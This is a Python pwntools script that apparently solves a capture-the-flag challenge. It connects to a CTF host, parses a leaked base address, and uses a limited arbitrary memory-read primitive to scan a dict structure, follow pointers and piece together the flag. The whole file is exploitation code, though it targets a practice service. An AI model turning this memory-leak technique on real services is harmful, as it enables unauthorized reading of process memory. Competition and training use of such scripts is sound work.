from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
base = int(m.group(1), 16)
print(f'Dict base: {hex(base)}')

def read_memory(addr):
    addr_str = f"{addr:x}"
    io.sendline(addr_str.encode())
    line = io.recvline(timeout=3).decode().strip()
    
    # Parse the response: "read from: 0xADDRESS: HEXDATA"
    if 'illegal memory address' in line:
        return None
        
    # Extract hex data after the last colon
    parts = line.split(': ')
    if len(parts) >= 2:
        hex_data = parts[-1].strip()
        try:
            return bytes.fromhex(hex_data)
        except:
            return None
    return None

print("\n=== Scanning dict structure for flag data ===")

reads_used = 0
max_reads = 48
flag_chars = {}

# Scan the dict object and look for pointers
for offset in range(0, 0x100, 8):
    if reads_used >= max_reads:
        break
        
    addr = base + offset
    data = read_memory(addr)
    reads_used += 1
    
    if data:
        val = u64(data)
        chars = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in data)
        print(f'{addr:#x}+{offset:#x}: {data.hex()} -> {val:#x} "{chars}"')
        
        # If this looks like a pointer, try reading from it
        if 0x400000 < val < 0x800000000000 and reads_used < max_reads - 5:
            print(f'  Following pointer {val:#x}...')
            ptr_data = read_memory(val)
            reads_used += 1
            
            if ptr_data:
                ptr_chars = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in ptr_data)
                clean_chars = ''.join(chr(b) for b in ptr_data if 32 <= b <= 126 and b != 0)
                print(f'  -> {val:#x}: {ptr_data.hex()} = "{ptr_chars}" (clean: "{clean_chars}")')
                
                # Check for flag content
                if clean_chars and any(c in clean_chars for c in 'KCSCflag{}'):
                    print(f'  *** POTENTIAL FLAG FRAGMENT: "{clean_chars}" ***')
                
                # If it's a single character, could be part of shuffled flag
                if len(clean_chars) == 1 and clean_chars.isalnum() or clean_chars in '{}_-':
                    print(f'  *** FLAG CHAR CANDIDATE: "{clean_chars}" at offset {offset} ***')
                    flag_chars[offset] = clean_chars

print(f"\nUsed {reads_used}/{max_reads} reads")

if flag_chars:
    print("\n=== Found potential flag characters ===")
    for offset, char in sorted(flag_chars.items()):
        print(f"Offset {offset}: '{char}'")
        
    # Try to reconstruct flag
    flag_attempt = ''.join(flag_chars.get(i*8, '?') for i in range(len(flag_chars)))
    print(f"Reconstruction attempt: {flag_attempt}")

# If we still have reads left, try scanning around any promising addresses we found
if reads_used < max_reads - 10:
    print(f"\n=== Extended scan with {max_reads - reads_used} reads remaining ===")
    
    # Scan around the base address more thoroughly
    for offset in range(-0x50, 0x200, 8):
        if reads_used >= max_reads - 2:
            break
            
        addr = base + offset
        if addr <= 0:
            continue
            
        data = read_memory(addr)
        reads_used += 1
        
        if data:
            clean = ''.join(chr(b) for b in data if 32 <= b <= 126)
            if len(clean) >= 3:
                print(f'{addr:#x}: "{clean}"')
                if any(pattern in clean for pattern in ['KCSC', 'flag', '{', '}']):
                    print(f'  *** FLAG PATTERN: "{clean}" ***')

io.close()